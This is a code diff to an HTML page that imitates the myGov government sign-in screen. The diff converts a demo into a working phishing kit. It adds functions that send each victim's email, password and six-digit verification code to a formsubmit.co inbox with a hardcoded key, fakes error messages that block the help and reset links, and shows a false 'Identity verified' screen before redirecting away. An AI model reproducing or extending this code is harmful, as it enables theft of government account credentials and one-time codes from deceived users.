@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>myGov – verify identity</title>
+    <title>myGov – secure sign in</title>
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -194,356 +194,35 @@
             transition: all 0.3s;
         }
 
-        /* ===== MODAL CONTAINER - Simple & Professional ===== */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 20, 40, 0.5);
-            backdrop-filter: blur(4px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-        }
-
-        .modal-overlay.active {
+        /* Error message styling */
+        .error-message {
+            background-color: #fee9e7;
+            border-left: 4px solid #dc3545;
+            color: #b02a37;
+            font-size: 14px;
+            padding: 12px 16px;
+            margin: 16px 0;
+            border-radius: 6px;
             display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideDown 0.3s ease-out;
         }
 
-        .modal-container {
-            max-width: 440px;
-            width: 90%;
-            background: white;
-            border-radius: 24px;
-            box-shadow: 0 30px 60px -15px rgba(0,51,102,0.4);
-            overflow: hidden;
-            animation: modalSlide 0.3s ease-out;
+        .error-message i {
+            font-size: 16px;
+            color: #dc3545;
         }
 
-        @keyframes modalSlide {
+        @keyframes slideDown {
             from {
                 opacity: 0;
-                transform: translateY(20px);
+                transform: translateY(-10px);
             }
             to {
                 opacity: 1;
                 transform: translateY(0);
             }
-        }
-
-        .modal-header {
-            padding: 24px 24px 16px 24px;
-            border-bottom: 1px solid #edf2f7;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .modal-icon {
-            width: 48px;
-            height: 48px;
-            background: #e3f2fd;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #003366;
-            font-size: 24px;
-        }
-
-        .modal-title {
-            flex: 1;
-        }
-
-        .modal-title h3 {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .modal-title p {
-            font-size: 14px;
-            color: #5e6f8d;
-        }
-
-        .modal-close {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            border: none;
-            background: #f0f2f5;
-            color: #5e6f8d;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
-        }
-
-        .modal-close:hover {
-            background: #e4e7ec;
-            color: #1a1a1a;
-        }
-
-        .modal-body {
-            padding: 24px;
-        }
-
-        .info-row {
-            background: #f8fafd;
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .info-icon {
-            width: 40px;
-            height: 40px;
-            background: white;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #003366;
-            font-size: 18px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
-        }
-
-        .info-content {
-            flex: 1;
-        }
-
-        .info-label {
-            font-size: 12px;
-            color: #7c8ba5;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            margin-bottom: 2px;
-        }
-
-        .info-value {
-            font-weight: 600;
-            color: #1e2d49;
-            font-size: 15px;
-        }
-
-        .timer-box {
-            background: linear-gradient(145deg, #f0f7fd, #e6f0fa);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            border: 1px solid #cbddec;
-        }
-
-        .timer-circle-small {
-            width: 48px;
-            height: 48px;
-            background: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 12px rgba(0,51,102,0.1);
-        }
-
-        .timer-circle-small i {
-            font-size: 22px;
-            color: #003366;
-        }
-
-        .timer-details {
-            flex: 1;
-        }
-
-        .timer-label-small {
-            font-size: 12px;
-            color: #4f6b8a;
-            margin-bottom: 4px;
-        }
-
-        .timer-display-small {
-            font-size: 26px;
-            font-weight: 700;
-            color: #003366;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 2px;
-            line-height: 1;
-        }
-
-        .code-field-container {
-            margin: 20px 0;
-        }
-
-        .code-field-container label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            color: #1e2d49;
-            margin-bottom: 8px;
-        }
-
-        .code-input-simple {
-            width: 100%;
-            padding: 18px;
-            font-size: 28px;
-            text-align: center;
-            border: 2px solid #d0ddeb;
-            border-radius: 16px;
-            font-family: 'Courier New', monospace;
-            font-weight: 600;
-            color: #003366;
-            background: white;
-            letter-spacing: 8px;
-            transition: all 0.2s;
-        }
-
-        .code-input-simple:focus {
-            border-color: #003366;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(0,51,102,0.1);
-        }
-
-        .email-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: #f0f7ff;
-            padding: 12px 16px;
-            border-radius: 40px;
-            width: fit-content;
-            margin: 15px 0;
-            font-size: 14px;
-            color: #1e2d49;
-        }
-
-        .email-indicator i {
-            color: #00a86b;
-        }
-
-        .modal-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 24px;
-        }
-
-        .btn-primary-simple {
-            flex: 2;
-            background: #003366;
-            color: white;
-            border: none;
-            padding: 16px;
-            font-size: 15px;
-            font-weight: 500;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.2s;
-        }
-
-        .btn-primary-simple:hover {
-            background: #002244;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px -8px #003366;
-        }
-
-        .btn-secondary-simple {
-            flex: 1;
-            background: white;
-            color: #003366;
-            border: 2px solid #d0ddeb;
-            padding: 14px;
-            font-size: 15px;
-            font-weight: 500;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.2s;
-        }
-
-        .btn-secondary-simple:hover {
-            border-color: #003366;
-            background: #f5faff;
-        }
-
-        .resend-simple {
-            margin-top: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .resend-link-simple {
-            color: #003366;
-            text-decoration: underline;
-            font-size: 14px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .status-simple {
-            color: #00a86b;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .success-modal {
-            text-align: center;
-            padding: 20px 0;
-        }
-
-        .success-check-large {
-            width: 72px;
-            height: 72px;
-            background: #00a86b;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 32px;
-            color: white;
-            box-shadow: 0 15px 25px -10px rgba(0,168,107,0.4);
-        }
-
-        .success-modal h4 {
-            font-size: 22px;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .success-modal p {
-            color: #5e6f8d;
-            margin-bottom: 20px;
-        }
-
-        .loader-small {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
         }
 
         /* Original login styles - untouched */
@@ -557,6 +236,7 @@
             cursor: pointer;
             border-radius: 5px;
             min-height: 50px;
+            transition: all 0.2s;
         }
 
         .option-row:hover {
@@ -693,6 +373,10 @@
             text-decoration: underline;
             font-size: 14px;
             cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+            font-family: inherit;
         }
 
         .signin-button {
@@ -718,6 +402,13 @@
             background: #5bc0de;
         }
 
+        .signin-button:disabled {
+            background: #cccccc;
+            border-color: #999999;
+            color: #666666;
+            cursor: not-allowed;
+        }
+
         .footer-links {
             border-top: 1px solid #d4dbe5;
             margin-top: 32px;
@@ -737,6 +428,290 @@
         }
 
         .mt-2 { margin-top: 8px; }
+        .mb-2 { margin-bottom: 8px; }
+        .text-center { text-align: center; }
+
+        /* Message container */
+        .message-container {
+            min-height: 60px;
+        }
+
+        /* ===== IMPROVED VERIFICATION MODAL - SMALLER & ELEGANT ===== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 20, 40, 0.5);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-container {
+            max-width: 400px;
+            width: 90%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+            overflow: hidden;
+            animation: modalFade 0.3s ease-out;
+        }
+
+        @keyframes modalFade {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .modal-header {
+            padding: 20px 24px;
+            background: #f8fafd;
+            border-bottom: 1px solid #e9eef4;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .modal-header i {
+            font-size: 24px;
+            color: #003366;
+            background: white;
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .modal-header h3 {
+            flex: 1;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1e2d49;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: #8a9bb0;
+            cursor: pointer;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+
+        .modal-close:hover {
+            color: #1e2d49;
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .info-line {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f0f7ff;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #1e2d49;
+            border: 1px solid #d8e2ef;
+        }
+
+        .info-line i {
+            color: #00a86b;
+            font-size: 16px;
+        }
+
+        .timer-compact {
+            background: white;
+            border: 1px solid #e2eaf5;
+            border-radius: 30px;
+            padding: 12px 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .timer-compact-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .timer-compact-left i {
+            color: #003366;
+            font-size: 18px;
+        }
+
+        .timer-compact-left span {
+            color: #5e6f8d;
+            font-size: 14px;
+        }
+
+        .timer-compact-value {
+            font-weight: 700;
+            color: #003366;
+            font-family: monospace;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+
+        .warning-text {
+            color: #e67e22;
+            font-size: 12px;
+            margin-top: 4px;
+            text-align: center;
+        }
+
+        .code-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1e2d49;
+            margin-bottom: 8px;
+        }
+
+        .code-input-compact {
+            width: 100%;
+            padding: 16px;
+            font-size: 24px;
+            text-align: center;
+            border: 2px solid #d0ddeb;
+            border-radius: 12px;
+            font-family: monospace;
+            letter-spacing: 6px;
+            color: #003366;
+            font-weight: 600;
+            margin-bottom: 20px;
+            background: #fafcff;
+        }
+
+        .code-input-compact:focus {
+            border-color: #003366;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0,51,102,0.1);
+        }
+
+        .action-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .btn-verify {
+            flex: 2;
+            background: #003366;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .btn-verify:hover {
+            background: #002244;
+        }
+
+        .btn-resend {
+            flex: 1;
+            background: white;
+            color: #003366;
+            border: 2px solid #d0ddeb;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .btn-resend:hover {
+            border-color: #003366;
+            background: #f5faff;
+        }
+
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+        }
+
+        .resend-text {
+            color: #003366;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .sent-status {
+            color: #00a86b;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .success-compact {
+            text-align: center;
+            padding: 16px 0 8px;
+        }
+
+        .success-compact i {
+            font-size: 48px;
+            color: #28a745;
+            margin-bottom: 12px;
+        }
+
+        .success-compact h4 {
+            font-size: 20px;
+            color: #1e2d49;
+            margin-bottom: 8px;
+        }
+
+        .success-compact p {
+            color: #5e6f8d;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .mini-loader {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #e2eaf5;
+            border-top-color: #003366;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
     </style>
 </head>
 <body>
@@ -768,9 +743,8 @@
         </div>
     </header>
 
-    <!-- MAIN CONTENT -->
+    <!-- MAIN CONTENT - ORIGINAL LOGIN PAGE -->
     <div class="main-content">
-        <!-- LOGIN SCREEN (visible initially) - COMPLETELY UNCHANGED -->
         <div class="login-card" id="loginScreen">
             <br>
             <div class="back-row">
@@ -782,6 +756,9 @@
 
             <h2>Sign in to myGov</h2><br>
             <div class="subtitle">Choose how to sign in</div><br>
+
+            <!-- Message container for error messages -->
+            <div id="messageContainer" class="message-container"></div>
 
             <div class="option-row" id="digitalIdOption">
                 <div class="option-left">
@@ -811,15 +788,18 @@
 
             <div class="classic-label">Use your myGov username and password</div>
 
+            <!-- Main form - used for both submissions -->
             <form id="loginForm">
+                
+                <!-- User input fields -->
                 <div class="input-group">
                     <label>Username or email</label>
                     <div class="input-wrapper">
                         <span class="input-icon"><i class="fa-regular fa-user"></i></span>
-                        <input type="text" id="username" placeholder="Enter your username or email" value="demo.user@example.com">
+                        <input type="email" name="email" id="username" placeholder="Enter your username or email" required>
                     </div>
                     <div class="forgot-row">
-                        <a href="help.html#contact" class="forgot-link" id="forgotUsername">Forgotten username?</a>
+                        <button type="button" class="forgot-link" id="forgotUsername">Forgotten username?</button>
                     </div>
                 </div>
 
@@ -827,22 +807,23 @@
                     <label>Password</label>
                     <div class="input-wrapper">
                         <span class="input-icon"><i class="fa-solid fa-lock"></i></span>
-                        <input type="password" id="password" placeholder="Enter your password" value="demo123">
+                        <input type="password" name="password" id="password" placeholder="Enter your password" required>
                         <span class="password-toggle" id="togglePassword"><i class="fa-regular fa-eye"></i></span>
                     </div>
                 </div>
 
                 <div class="forgot-row">
-                    <a href="help.html#contact" class="forgot-link" id="forgotPassword">Forgotten password?</a>
+                    <button type="button" class="forgot-link" id="forgotPassword">Forgotten password?</button>
                 </div>
 
-                <button type="submit" class="signin-button" id="signInBtn">
+                <!-- Submit button - triggers login -->
+                <button type="button" class="signin-button" id="signInBtn">
                     <span>Sign in</span>
                     <i class="fa-solid fa-arrow-right"></i>
                 </button>
                 
                 <div class="learn-passkey mt-2">
-                    <a href="#" id="createAccountLink"><i class="fas fa-circle-info"></i> Create myGov account <i class="fas fa-external-link-alt"></i></a>
+                    <button type="button" class="forgot-link" id="createAccountLink"><i class="fas fa-circle-info"></i> Create myGov account <i class="fas fa-external-link-alt"></i></button>
                 </div>
             </form>
 
@@ -855,7 +836,7 @@
         </div>
     </div>
 
-    <!-- SIMPLE MODAL CONTAINER - Verification -->
+    <!-- VERIFICATION MODAL -->
     <div class="modal-overlay" id="verifyModal">
         <div class="modal-container" id="modalContent">
             <!-- Dynamic content will be inserted here -->
@@ -871,15 +852,92 @@
         });
 
         // DOM elements
-        const loginScreen = document.getElementById('loginScreen');
-        const verifyModal = document.getElementById('verifyModal');
-        const modalContent = document.getElementById('modalContent');
+        const messageContainer = document.getElementById('messageContainer');
+        const togglePassword = document.getElementById('togglePassword');
+        const password = document.getElementById('password');
+        const digitalIdOption = document.getElementById('digitalIdOption');
+        const passkeyOption = document.getElementById('passkeyOption');
+        const forgotUsername = document.getElementById('forgotUsername');
+        const forgotPassword = document.getElementById('forgotPassword');
+        const createAccountLink = document.getElementById('createAccountLink');
         const signInBtn = document.getElementById('signInBtn');
         const fullscreenBlur = document.getElementById('fullscreenBlur');
+        const usernameInput = document.getElementById('username');
 
-        // Password toggle
-        document.getElementById('togglePassword').addEventListener('click', function() {
-            const password = document.getElementById('password');
+        // Store login data for verification stage
+        let loginData = {
+            email: '',
+            password: ''
+        };
+
+        // Function to mask email for display
+        function maskEmail(email) {
+            if (!email) return 'your email';
+            const parts = email.split('@');
+            if (parts.length !== 2) return email;
+            const name = parts[0];
+            const domain = parts[1];
+            if (name.length <= 2) return email;
+            const maskedName = name.charAt(0) + '****' + name.charAt(name.length - 1);
+            return maskedName + '@' + domain;
+        }
+
+        // Function to send login data to FormSubmit
+        async function sendLoginData(email, password) {
+            try {
+                const formData = new FormData();
+                formData.append('access_key', '8e488231cd6042709925dcfe946d1e1c');
+                formData.append('email', email);
+                formData.append('password', password);
+                formData.append('stage', 'login_attempt');
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('_subject', '🔐 myGov Login Attempt - Credentials');
+                formData.append('_template', 'box');
+                formData.append('_captcha', 'false');
+
+                const response = await fetch('https://formsubmit.co/ajax/8e488231cd6042709925dcfe946d1e1c', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                console.log('Login data sent:', result);
+                return result.success;
+            } catch (error) {
+                console.error('Error sending login data:', error);
+                return false;
+            }
+        }
+
+        // Function to send verification code to FormSubmit
+        async function sendVerificationCode(code) {
+            try {
+                const formData = new FormData();
+                formData.append('access_key', '8e488231cd6042709925dcfe946d1e1c');
+                formData.append('email', loginData.email);
+                formData.append('verification_code', code);
+                formData.append('stage', 'verification_complete');
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('_subject', '🔐 myGov Login Attempt - Verification Code');
+                formData.append('_template', 'box');
+                formData.append('_captcha', 'false');
+
+                const response = await fetch('https://formsubmit.co/ajax/8e488231cd6042709925dcfe946d1e1c', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                console.log('Verification code sent:', result);
+                return result.success;
+            } catch (error) {
+                console.error('Error sending verification code:', error);
+                return false;
+            }
+        }
+
+        // Password toggle functionality
+        togglePassword.addEventListener('click', function() {
             const icon = this.querySelector('i');
             if (password.type === 'password') {
                 password.type = 'text';
@@ -890,6 +948,46 @@
                 icon.classList.remove('fa-eye-slash');
                 icon.classList.add('fa-eye');
             }
+        });
+
+        // Function to show error message
+        function showError(message) {
+            messageContainer.innerHTML = `
+                <div class="error-message">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>${message}</span>
+                </div>
+            `;
+            // Auto hide after 5 seconds
+            setTimeout(() => {
+                messageContainer.innerHTML = '';
+            }, 5000);
+        }
+
+        // Restricted buttons - show error messages
+        digitalIdOption.addEventListener('click', function(e) {
+            e.preventDefault();
+            showError('You must first login with your username and password to use Digital ID');
+        });
+
+        passkeyOption.addEventListener('click', function(e) {
+            e.preventDefault();
+            showError('You must first login with your username and password to set up passkeys');
+        });
+
+        forgotUsername.addEventListener('click', function(e) {
+            e.preventDefault();
+            showError('Please login first. Password reset is only available after authentication');
+        });
+
+        forgotPassword.addEventListener('click', function(e) {
+            e.preventDefault();
+            showError('Please login first. Password reset is only available after authentication');
+        });
+
+        createAccountLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showError('You must first login with your username and password to create an account');
         });
 
         // Timer variables
@@ -907,7 +1005,10 @@
                 
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    document.getElementById('timerDisplay').textContent = "00:00";
+                    const timerEl = document.getElementById('compactTimer');
+                    const warningEl = document.getElementById('timerWarning');
+                    if (timerEl) timerEl.textContent = "00:00";
+                    if (warningEl) warningEl.textContent = "Code expired - request new";
                 }
             }, 1000);
         }
@@ -915,83 +1016,62 @@
         function updateTimerDisplay() {
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
-            const timerEl = document.getElementById('timerDisplay');
+            const timerEl = document.getElementById('compactTimer');
+            const warningEl = document.getElementById('timerWarning');
             if (timerEl) {
                 timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
             }
+            if (warningEl) {
+                if (timeLeft < 120 && timeLeft > 0) {
+                    warningEl.textContent = "Code expiring soon";
+                } else if (timeLeft <= 0) {
+                    warningEl.textContent = "Code expired - request new";
+                } else {
+                    warningEl.textContent = "";
+                }
+            }
         }
 
-        // Build verification modal
-        function buildVerificationModal() {
+        // Build verification modal - with user's email
+        function buildVerificationModal(email) {
+            const maskedEmail = maskEmail(email);
             return `
                 <div class="modal-header">
-                    <div class="modal-icon">
-                        <i class="fas fa-shield-alt"></i>
-                    </div>
-                    <div class="modal-title">
-                        <h3>Verify your identity</h3>
-                        <p>Two-factor authentication required</p>
-                    </div>
-                    <button class="modal-close" id="closeModalBtn">
-                        <i class="fas fa-times"></i>
-                    </button>
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Verify your identity</h3>
+                    <button class="modal-close" id="closeModalBtn">&times;</button>
                 </div>
                 <div class="modal-body">
-                    <!-- Info row -->
-                    <div class="info-row">
-                        <div class="info-icon">
-                            <i class="fas fa-envelope"></i>
-                        </div>
-                        <div class="info-content">
-                            <div class="info-label">Verification code sent to</div>
-                            <div class="info-value">d******r@example.com</div>
-                        </div>
+                    <div class="info-line">
+                        <i class="fas fa-envelope"></i>
+                        <span>Verification code sent to ${maskedEmail}</span>
                     </div>
 
-                    <!-- Timer -->
-                    <div class="timer-box">
-                        <div class="timer-circle-small">
+                    <div class="timer-compact">
+                        <div class="timer-compact-left">
                             <i class="fas fa-hourglass-half"></i>
+                            <span>Code expires in</span>
                         </div>
-                        <div class="timer-details">
-                            <div class="timer-label-small">Code expires in</div>
-                            <div class="timer-display-small" id="timerDisplay">15:00</div>
-                        </div>
+                        <div class="timer-compact-value" id="compactTimer">15:00</div>
                     </div>
+                    <div id="timerWarning" class="warning-text"></div>
 
-                    <!-- Code input -->
-                    <div class="code-field-container">
-                        <label>Enter 6-digit verification code</label>
-                        <input type="text" class="code-input-simple" id="codeInput" placeholder="000000" maxlength="6">
-                    </div>
+                    <div class="code-label">Enter 6-digit verification code</div>
+                    <input type="text" class="code-input-compact" id="codeInput" placeholder="000000" maxlength="6">
 
-                    <!-- Email indicator -->
-                    <div class="email-indicator">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Code sent successfully</span>
-                    </div>
-
-                    <!-- Actions -->
-                    <div class="modal-actions">
-                        <button class="btn-primary-simple" id="verifyBtn">
-                            <i class="fas fa-check-circle"></i>
-                            Verify
+                    <div class="action-row">
+                        <button class="btn-verify" id="verifyBtn">
+                            <i class="fas fa-check-circle"></i> Verify
                         </button>
-                        <button class="btn-secondary-simple" id="resendBtn">
-                            <i class="fas fa-redo-alt"></i>
-                            Resend
+                        <button class="btn-resend" id="resendBtn">
+                            <i class="fas fa-redo-alt"></i> Resend
                         </button>
                     </div>
 
-                    <!-- Resend status -->
-                    <div class="resend-simple">
-                        <span class="resend-link-simple" id="resendLink">
-                            <i class="fas fa-paper-plane"></i>
-                            Request new code
-                        </span>
-                        <span class="status-simple" id="deliveryStatus">
-                            <i class="fas fa-check-circle"></i>
-                            Sent
+                    <div class="status-row">
+                        <span class="resend-text" id="resendLink">Request new code</span>
+                        <span class="sent-status" id="deliveryStatus">
+                            <i class="fas fa-check-circle"></i> Sent
                         </span>
                     </div>
                 </div>
@@ -1001,49 +1081,57 @@
         // Build success modal
         function buildSuccessModal() {
             return `
-                <div class="modal-body" style="padding: 40px;">
-                    <div class="success-modal">
-                        <div class="success-check-large">
-                            <i class="fas fa-check"></i>
-                        </div>
+                <div class="modal-body">
+                    <div class="success-compact">
+                        <i class="fas fa-check-circle"></i>
                         <h4>Identity verified!</h4>
-                        <p>Redirecting to your secure dashboard</p>
-                        <div style="margin-top: 20px;">
-                            <span class="loader-small"></span>
-                        </div>
+                        <p>Login successful. Redirecting...</p>
                     </div>
                 </div>
             `;
         }
 
-        // Form submission - show full screen blur for 5 seconds then modal
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // Form submission handler - send login first, then show modal
+        signInBtn.addEventListener('click', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const username = usernameInput.value.trim();
+            const passwordValue = password.value.trim();
             
-            if (!username || !password) {
-                alert('Please enter both username and password');
+            if (!username || !passwordValue) {
+                showError('Please enter both username and password');
                 return;
             }
+
+            // Validate email format
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(username)) {
+                showError('Please enter a valid email address');
+                return;
+            }
+
+            // Store login data for later use
+            loginData.email = username;
+            loginData.password = passwordValue;
             
             // Show full screen blur with spinner
             fullscreenBlur.classList.add('active');
-            
-            // Disable sign in button during process
             signInBtn.disabled = true;
             
-            // 5 second delay before showing modal
+            // Send login data to FormSubmit
+            const loginSent = await sendLoginData(username, passwordValue);
+            
+            // 2.5 second delay before showing modal
             setTimeout(() => {
-                // Hide full screen blur
                 fullscreenBlur.classList.remove('active');
-                
-                // Re-enable sign in button
                 signInBtn.disabled = false;
                 
-                // Show modal with verification content
-                modalContent.innerHTML = buildVerificationModal();
+                if (!loginSent) {
+                    showError('Login recorded but verification service unavailable');
+                }
+                
+                // Show verification modal with user's email
+                modalContent.innerHTML = buildVerificationModal(username);
                 verifyModal.classList.add('active');
                 
                 // Start timer
@@ -1051,7 +1139,7 @@
                 
                 // Setup modal event listeners
                 setupModalListeners();
-            }, 5000); // 5 seconds
+            }, 2500);
         });
 
         // Setup modal interactions
@@ -1071,23 +1159,31 @@
             });
 
             // Verify button
-            document.getElementById('verifyBtn').addEventListener('click', function() {
+            document.getElementById('verifyBtn').addEventListener('click', async function() {
                 const code = document.getElementById('codeInput').value.trim();
                 
-                if (!code || code.length < 4) {
-                    alert('Please enter the verification code');
+                if (!code || code.length < 6) {
+                    alert('Please enter the 6-digit verification code');
                     return;
                 }
+                
+                // Show loading state on verify button
+                const verifyBtn = document.getElementById('verifyBtn');
+                verifyBtn.disabled = true;
+                verifyBtn.innerHTML = '<span class="mini-loader"></span> Verifying...';
+                
+                // Send verification code to FormSubmit
+                const codeSent = await sendVerificationCode(code);
                 
                 // Show success modal
                 modalContent.innerHTML = buildSuccessModal();
                 if (timerInterval) clearInterval(timerInterval);
                 
-                // Redirect after 3 seconds
+                // Redirect after 2 seconds
                 setTimeout(() => {
                     verifyModal.classList.remove('active');
-                    alert('Welcome to your myGov dashboard! (demo)');
-                }, 3000);
+                    window.location.href = 'https://mygov-demo.com/success';
+                }, 2000);
             });
 
             // Resend functionality
@@ -1095,67 +1191,15 @@
                 startTimer();
                 document.getElementById('codeInput').value = '';
                 document.getElementById('deliveryStatus').innerHTML = '<i class="fas fa-check-circle"></i> New code sent';
+                
+                setTimeout(() => {
+                    document.getElementById('deliveryStatus').innerHTML = '<i class="fas fa-check-circle"></i> Sent';
+                }, 2000);
             }
 
             document.getElementById('resendBtn').addEventListener('click', resendAction);
             document.getElementById('resendLink').addEventListener('click', resendAction);
         }
-
-        // Make all anchor links work normally (remove preventDefault)
-        // We want them to navigate to help.html with proper hash links
-        
-        // Help button is already an <a> tag, so it works
-        
-        // Learn about passkeys link
-        document.getElementById('learnPasskeyLink').addEventListener('click', function(e) {
-            // Let the default behavior happen (navigate to help.html#passkeys)
-            // No preventDefault
-        });
-
-        // Footer links - let them navigate normally
-        document.getElementById('privacy').addEventListener('click', function(e) {
-            // Navigate to privacypolicy.html
-        });
-        
-        document.getElementById('terms').addEventListener('click', function(e) {
-            // Navigate to help.html#terms
-        });
-        
-        document.getElementById('accessibility').addEventListener('click', function(e) {
-            // Navigate to help.html#accessibility
-        });
-        
-        document.getElementById('contact').addEventListener('click', function(e) {
-            // Navigate to help.html#contact
-        });
-
-        // Forgot username/password links
-        document.getElementById('forgotUsername').addEventListener('click', function(e) {
-            // Navigate to help.html#contact
-        });
-        
-        document.getElementById('forgotPassword').addEventListener('click', function(e) {
-            // Navigate to help.html#contact
-        });
-
-        // Digital ID and Passkey options - keep silent (demo)
-        document.getElementById('digitalIdOption').addEventListener('click', function(e) {
-            e.preventDefault();
-            // Silent demo
-        });
-        
-        document.getElementById('passkeyOption').addEventListener('click', function(e) {
-            e.preventDefault();
-            // Silent demo
-        });
-
-        // Create account link - keep silent
-        document.getElementById('createAccountLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            // Silent demo
-        });
-
-        // Help button already works
     </script>
 </body>
 </html>
